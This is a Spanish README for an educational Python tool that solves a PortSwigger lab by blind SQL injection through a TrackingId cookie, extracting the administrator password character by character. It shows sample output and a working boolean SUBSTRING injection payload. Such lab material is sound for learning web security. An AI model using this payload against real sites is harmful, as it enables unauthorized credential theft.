# SQL Injection Brute Force – Administrator Password Extractor

![Python](https://img.shields.io/badge/python-3.8%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Status](https://img.shields.io/badge/status-completado-success)

> Herramienta educativa para resolver el laboratorio **"SQL injection vulnerability allowing login bypass"** de [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection).

Este script realiza un **ataque de fuerza bruta por inyección SQL** para extraer carácter por carácter la contraseña del usuario `administrator` mediante la cookie `TrackingId`.

---

## Características

- Extracción automática de la contraseña (máx. 20 caracteres)
- Soporte para interrupción limpia con `Ctrl+C`
- Progreso visual con `pwntools` y `termcolor`
- Manejo de errores de red y timeouts
- Evita rate limiting con pausas

---

## Requisitos

```bash
pip install requests pwntools termcolor
```

## Ejemplo de salida:
```sh
[+] SQLI: Iniciando ataque de fuerza bruta
[+] SQLI: Probando posición 1: a
[+] SQLI: Probando posición 1: b
[+] SQLI: Probando posición 1: c
[+] Password: c
[+] SQLI: Probando posición 2: 0
[+] Password: c0
...
[+] Contraseña del administrador: c0d3r123abcxyz
```


## Estructura del Payload SQL

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='c'-- -
```


### Advertencia
Uso exclusivo educativo y ético.
Solo en entornos autorizados como PortSwigger Labs.
